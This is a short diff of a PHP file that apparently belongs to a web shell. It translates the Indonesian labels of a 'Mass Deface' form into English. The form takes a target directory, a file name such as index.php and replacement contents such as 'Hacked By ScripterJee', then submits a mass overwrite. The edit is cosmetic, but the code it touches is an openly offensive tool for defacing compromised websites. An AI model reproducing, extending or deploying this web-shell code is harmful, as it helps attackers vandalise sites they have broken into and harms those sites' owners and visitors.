@@ -561,15 +561,15 @@ function aksiMasdef($dir,$file,$imgfol,$imgfile){
       <div class='text-center'>
         <h5>Tipe :</h5>
         <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
-        <label for='toggle-on' class='butn'>Biasa</label>
+        <label for='toggle-on' class='butn'>Normal</label>
         <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
-        <label for='toggle-off' class='butn'>Masal</label>
+        <label for='toggle-off' class='butn'>Mass</label>
       </div> 
-      <h5>$imgfol Lokasi :</h5>
+      <h5>$imgfol Location :</h5>
       <input type='text' name='d_dir' value='$dir' class='form-control'><br>
       <h5>$imgfile Nama File :</h5>
       <input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
-      <h5>$imgfile Isi File :</h5>
+      <h5>$imgfile File Contents :</h5>
       <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By ScripterJee'></textarea><br/>
       <input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
     </form>";
